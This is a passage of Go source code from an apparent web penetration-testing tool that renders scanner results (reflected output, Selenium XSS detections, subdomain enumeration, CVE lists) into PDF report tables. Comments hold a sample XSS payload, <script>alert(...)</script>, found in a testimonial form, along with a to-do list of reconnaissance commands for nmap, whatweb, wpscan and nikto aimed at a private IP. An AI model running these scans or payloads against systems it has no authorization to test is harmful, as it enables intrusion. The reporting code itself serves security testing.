	// fmt.Println("STRIKE")
	// os.Exit(1)
	return pdf
}

func (h *pdfHandler) reflectedoutputtable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
					//	@TODO	tool output is a folder		Consider just using a str for this
				// h.execCmd(h.e.tools["wpscan"] + " -o " + filepath.ToSlash(path.Join(h.e.outputFolder, "/wpscan-out")) + " --url " + h.e.targetHost)

	var reflectedoutputURL string = path.Join(h.foldername, "/reflected_strings_and_urls.txt")
	var reflectedoutputstring string = u.ReturnFileContentsStr(reflectedoutputURL)
	res := toolparser.ParseReflectedOutput(reflectedoutputstring)

	if len(res) > 0 {
		pdf.AddPage()
		pdf.Cell(40, 10, "User Controlled - Reflected Output Table")
		pdf.Ln(-1)
	
		pdf = h.examplemultiwraptable(pdf, res)
	}

	return pdf
}

func (h *pdfHandler) seleniumxsstable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
	pdf.AddPage()
	pdf.Cell(40, 10, "XSS - Selenium Testing Table")
	pdf.Ln(-1)

	//	Need to filter and output this:
	// [*]     XSS - Detected at:      http://192.168.1.20:80/index.php        -
    //     Form Location:  http://192.168.1.20:80/post-testimonial.php
    //     Payload:        <script>alert("tSBMWRZrPHjtSY50");</script>
    //     Form Contents:

	// 		<form method="post">                        
                                          
	// 				<div class="form-group">
	// 				<label class="control-label">Testimonial</label>
	// 				<textarea class="form-control white_bg" name="testimonial" rows="4" required=""></textarea>
	// 				</div>
																	
	// 				<div class="form-group">                        
	// 				<button type="submit" name="submit" class="btn">Save  <span class="angle_arrow">
	// 				<i class="fa fa-angle-right" aria-hidden="true"></i></span></button>                  
	// 				</div>
	// 			</form>
	// 		-

	var seleniumTestingOutURL string = path.Join(h.foldername, "/form_injection_detection.txt")
	var seleniumTestingOut string = u.ReturnFileContentsStr(seleniumTestingOutURL)
	res := toolparser.ParseSeleniumXSS(seleniumTestingOut)

	pdf = h.examplemultiwraptable(pdf, res)

	return pdf
}

// func (h *pdfHandler) injectiontesttable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
// 	pdf.AddPage()
// 	pdf.Cell(40, 10, "Injection Testing Table")
// 	pdf.Ln(-1)

// 	return nil
// }

func (h *pdfHandler) subdomainstable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {

	var gobusterSubdomainsOutURL string = path.Join(h.foldername, "/gobuster-Subdomains")
	var gobusterSubdomainsOut string = u.ReturnFileContentsStr(gobusterSubdomainsOutURL)
	res := toolparser.ParseGobusterSubdomains(gobusterSubdomainsOut)

	if len(res) > 0 {
		pdf.AddPage()
		pdf.Cell(40, 10, "Subdomain Enumeration Output Table")
		pdf.Ln(-1)
	
		pdf = h.examplemultiwraptable(pdf, res)
	}

	return pdf
}

func (h *pdfHandler) cvetable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
	
	var cvesOutURL string = path.Join(h.foldername, "/cves.list")
	var cvesOut string = u.ReturnFileContentsStr(cvesOutURL)
	res := toolparser.ParseCVEs(cvesOut)

	if len(res) > 0 {
		pdf.AddPage()
		pdf.Cell(40, 10, "CVEs Retrieved from NIST NVD")
		pdf.Ln(-1)

		pdf = h.examplemultiwraptable(pdf, res)
	}

	return pdf
}

func (h *pdfHandler) todo() {
	// httprint -h 192.168.1.20 -P0 -s /usr/share/httprint/signatures.txt -o OUTPUTFILE
	// whatweb -v -a4 192.168.1.20 --log-verbose OUTPUTFILE
	// whatweb -v -a3 192.168.1.20:80 -u=usern@mail.com:password --log-verbose OUTPUTFILE
 	// nmap -p 80 --script http-methods 192.168.1.20
	// 			http-headers
	// 			http-methods
	// 			http-apache-negotiation
	// 			http-date
 	// wpscan --url 192.168.1.20				//	--wp-content-dir, --scope option, --url value given is the correct one
 	// python Blindelephant.py http://192.168.1.20:80 guess
 	// nmap -p80 --script=http-comments-displayer 192.168.1.20 -oN OUTPUTFILE
 	// turbolist3r
	// arachni
 	// nikto -h TARGET:80 -Tuning x 6 -o OUTPUTFILE -Format txt
	// 			-id user@email.com:password
}

func (h *pdfHandler) examplemultiwraptable(pdf *gofpdf.Fpdf, tbl []string) *gofpdf.Fpdf {
	pdf.SetFont(fontname, "", 9) //	fontname, "B", 12
	pdf.SetFillColor(255, 255, 255)	//	(240, 240, 240)

	var columnWidthFraction float64 = 1.0
	// _, lineHeight := pdf.GetFontSize()

	pageWidth,_ := pdf.GetPageSize()
	margin,_,_,_ := pdf.GetMargins()

	usablePageWidth := pageWidth - 2*margin

	// var maxHeight float64
	var cellHeight float64 = 7

	// pdf.AddPage()
	var rowlength int = 112

	for _,tblrow := range tbl {
		// fmt.Println(tblrow)
		// columnWidth := (columnWidthFraction * usablePageWidth) - 2 // -2 for table margins
/*
		if len(string(tblrow)) > rowlength {		//	@TODO - Consider removing the if-else statement. if already handles the situation
			fmt.Println("HEYYEA")
			// splitStrings := pdf.SplitText(string(tblrow), columnWidth)
			// // if newHeight := float64(len(splitStrings)) * float64(lineHeight); newHeight > maxHeight {
			// // 	maxHeight = newHeight
			// // }
			var splitStrings []string
			// var previni int
			// // var newini int

			// for ri, rv := range tblrow {
			// 	fmt.Println(rv)
			// 	// res = res + string(rv)
			// 	// fmt.Printf("i%d r %c\n", i, r)
			// 	fmt.Println("ri----------------------------")
			// 	if ri > 0 && (ri+1)%80 == 0 {
			// 		// fmt.Printf("=>(%d) '%v'\n", i, res)
			// 		// res = ""
			// 		fmt.Println("APPENDING AT ri",ri)
			// 		splitStrings = append(splitStrings, string(rv)[previni:ri])
			// 		fmt.Println("PREV ri",ri)
			// 		previni=ri
			// 	}
			// }

			splitStrings = slicetolength(tblrow,rowlength)

			var len int = len(splitStrings)
			// for n,cellContent := range splitStrings {
			// 	fmt.Println(cellContent)
				
			// 	if n==len {	//	@CHECK HERE
			// 		fmt.Println("EQUAL")
			// 		pdf.CellFormat(columnWidthFraction*usablePageWidth, cellHeight,		//	maxHeight instead of cellHeight
			// 			cellContent, "LRB", 0, "L", false, 0, "")	//	LR was "1"			
			// 	} else {
			// 		fmt.Println("N")
			// 		pdf.CellFormat(columnWidthFraction*usablePageWidth, cellHeight,		//	maxHeight instead of cellHeight
			// 			cellContent, "LRB", 0, "L", false, 0, "")	//	LR was "1"
			// 	}
			// 	// fmt.Println("=====",n,"====",ns)
			// 	pdf.Ln(-1)
			// }
			for i:=0; i<len; i++ {

				if i == (len-1) {	//	It is the last
					pdf.CellFormat(columnWidthFraction*usablePageWidth, cellHeight,		//	maxHeight instead of cellHeight
						splitStrings[i], "LRB", 0, "L", false, 0, "")	//	LR was "1"
				} else {			//	It is not the last
					pdf.CellFormat(columnWidthFraction*usablePageWidth, cellHeight,		//	maxHeight instead of cellHeight
						splitStrings[i], "LR", 0, "L", false, 0, "")	//	LR was "1"
				}
				pdf.Ln(-1)
			}
		} else {
			fmt.Println("NOOOOO")
			// splitStrings := pdf.SplitText(string(tblrow), columnWidth)
			pdf.CellFormat(columnWidthFraction*usablePageWidth, cellHeight,		//	maxHeight instead of cellHeight
				tblrow, "1", 0, "L", false, 0, "")
			pdf.Ln(-1)
		}
*/
		var splitStrings []string
		splitStrings = slicetolength(tblrow,rowlength)

		var length int = len(splitStrings)
		for i:=0; i<length; i++ {

			if i == (length-1) {	//	Last
				pdf.CellFormat(columnWidthFraction*usablePageWidth, cellHeight,		//	maxHeight instead of cellHeight
					splitStrings[i], "B", 0, "L", false, 0, "")	//	LR was "1"
			} else if (i == 0) {	//	First
				pdf.CellFormat(columnWidthFraction*usablePageWidth, cellHeight,		//	maxHeight instead of cellHeight
					splitStrings[i], "T", 0, "L", false, 0, "")
			} else {				//	It is not the last
				pdf.CellFormat(columnWidthFraction*usablePageWidth, cellHeight,		//	maxHeight instead of cellHeight
					splitStrings[i], "", 0, "L", false, 0, "")
			}
			pdf.Ln(-1)
		}
	}

	return pdf
}

func slicetolength(s string, piecesize int) []string {
    if piecesize >= len(s) {
        return []string{s}
    }
    var pieces []string
    piece := make([]rune, piecesize)
    len := 0
    for _, r := range s {
        piece[len] = r
        len++
        if len == piecesize {
            pieces = append(pieces, string(piece))
            len = 0
        }
    }
    if len > 0 {
        pieces = append(pieces, string(piece[:len]))
    }
    return pieces
}

/*
func (h *pdfHandler) examplewraprowtable(pdf *gofpdf.Fpdf, tblrow []string) *gofpdf.Fpdf {
	var columnWidthFraction float64 = 1.0
	_, lineHeight := pdf.GetFontSize()

	pageWidth,_ := pdf.GetPageSize()
	margin,_,_,_ := pdf.GetMargins()

	usablePageWidth := pageWidth - 2*margin

	var maxHeight float64

	for _, cellContent := range tblrow {
		columnWidth := (columnWidthFraction * usablePageWidth) - 2 // -2 for table margins

		splitStrings := pdf.SplitText(cellContent, columnWidth)
		if newHeight := float64(len(splitStrings)) * float64(lineHeight); newHeight > maxHeight {
			maxHeight = newHeight
		}
	}

	for _, cellContent := range tblrow {
		pdf.CellFormat(columnWidthFraction*usablePageWidth, maxHeight,
			cellContent, "1", 0, "L", false, 0, "")
			pdf.Ln(-1)
	}
	return pdf
}
*/

// fmt.Println("LINE IS:",string(line))
// //	@NOW
// var tablelinesize int = 80
// if l>tablelinesize {
// 	var rownumber int = l/tablelinesize
// 	fmt.Println("ROW IS", rownumber)
// 	//var lastline int = l%tablelinesize
// 	var ini,fin int
// 	for i:=0; i<rownumber; i++ {
// 		ini = i*rownumber
// 		fin = (i+1)*rownumber
// 		fmt.Println("l", l)
// 		fmt.Println("INI", ini)
// 		fmt.Println("FIN", fin)
// 		fmt.Println(string(line[ini:fin]))
// 		pdf.CellFormat(195, 7, string(line[ini:fin]), "1", 0, "LM", true, 0, "")
// 	}
// 	if (l%tablelinesize != 0) {
// 		pdf.CellFormat(195, 7, string(line[fin:]), "1", 0, "LM", true, 0, "")
// 		fmt.Println(string(line[fin:]))
// 	}
// } else {
// 	//	@PREVIOUS
// 	pdf.CellFormat(195, 7, string(line), "1", 0, "LM", true, 0, "")
// }